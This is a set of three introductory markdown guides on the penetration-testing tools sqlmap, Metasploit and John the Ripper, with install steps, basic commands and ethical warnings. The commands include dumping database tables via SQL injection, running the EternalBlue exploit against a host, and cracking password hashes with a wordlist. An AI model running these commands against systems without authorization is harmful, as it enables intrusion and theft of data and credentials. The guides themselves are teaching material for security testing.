📘 sqlmap.md

# 🛢️ SQLMap Basics Guide

## What is SQLMap?
SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities in web applications.

---

## 🛠️ Installation

**Linux (Debian/Ubuntu):**
```bash
sudo apt update && sudo apt install sqlmap

MacOS (with Homebrew):

brew install sqlmap

Windows:
Download from https://github.com/sqlmapproject/sqlmap or use Windows Subsystem for Linux (WSL).
⚡ Basic Commands
1. Test a URL for SQL injection

sqlmap -u "http://example.com/page.php?id=1"

<!-- [ADD SCREENSHOT: Terminal showing sqlmap testing a URL] -->
2. Enumerate database names

sqlmap -u "http://example.com/page.php?id=1" --dbs

<!-- [ADD SCREENSHOT: Terminal showing sqlmap enumerating databases] -->
3. Enumerate tables in a database

sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

<!-- [ADD SCREENSHOT: Terminal showing sqlmap listing tables] -->
4. Dump database table contents

sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump

<!-- [ADD SCREENSHOT: Terminal showing sqlmap dumping table contents] -->
🎯 When to Use

    Identify SQL injection points on a web app

    Extract sensitive database information

    Test security posture of web applications

⚠️ Ethical Warning

Only test web applications you have explicit permission to test. Unauthorized attacks are illegal and unethical.
✅ Tip

Use --batch flag for automated, non-interactive testing.


---

## 📘 `metasploit.md`
```markdown
# 💥 Metasploit Basics Guide

## What is Metasploit?
Metasploit is a powerful open-source framework used for developing, testing, and executing exploit code against remote targets. It’s a staple tool for penetration testers.

---

## 🛠️ Installation

**Linux (Debian/Ubuntu):**
```bash
sudo apt update && sudo apt install metasploit-framework

MacOS:
Use Homebrew or download from Metasploit install guide

Windows:
Download installer from Metasploit install guide
⚡ Basic Usage
1. Start Metasploit console

msfconsole

<!-- [ADD SCREENSHOT: msfconsole starting up] -->
2. Search for exploits

search type:exploit name:windows

<!-- [ADD SCREENSHOT: Searching exploits in msfconsole] -->
3. Select an exploit

use exploit/windows/smb/ms17_010_eternalblue

<!-- [ADD SCREENSHOT: Exploit selected in msfconsole] -->
4. Set target options

set RHOSTS 192.168.1.10
set RPORT 445

<!-- [ADD SCREENSHOT: Setting target options] -->
5. Run the exploit

run

<!-- [ADD SCREENSHOT: Exploit running] -->
🎯 When to Use

    Exploit known vulnerabilities for penetration testing

    Post-exploitation modules (gather info, escalate privileges)

    Testing network and host defenses

⚠️ Ethical Warning

Use Metasploit only in authorized environments. Unauthorized exploitation is illegal and unethical.
✅ Tip

Keep your Metasploit updated with msfupdate.


---

## 📘 `john_the_ripper.md`
```markdown
# 🔑 John the Ripper Basics Guide

## What is John the Ripper?
John the Ripper is a fast password cracking tool widely used to test password strength by brute forcing or using wordlists.

---

## 🛠️ Installation

**Linux (Debian/Ubuntu):**
```bash
sudo apt update && sudo apt install john

MacOS:

brew install john

Windows:
Download binaries from John the Ripper official
⚡ Basic Commands
1. Crack a password hash file

john hashes.txt

<!-- [ADD SCREENSHOT: John cracking hashes] -->
2. Show cracked passwords

john --show hashes.txt

<!-- [ADD SCREENSHOT: Showing cracked passwords] -->
3. Use a wordlist for cracking

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

<!-- [ADD SCREENSHOT: Using wordlist with john] -->
4. Run a single crack mode (fast, simple)

john --single hashes.txt

<!-- [ADD SCREENSHOT: Single crack mode running] -->
🎯 When to Use

    Test password strength during audits

    Recover lost passwords (if authorized)

    Learn about password security and cracking techniques

⚠️ Ethical Warning

Use John only on hashes you own or have permission to test. Unauthorized cracking is illegal.
✅ Tip

Combine with hashcat for GPU accelerated cracking.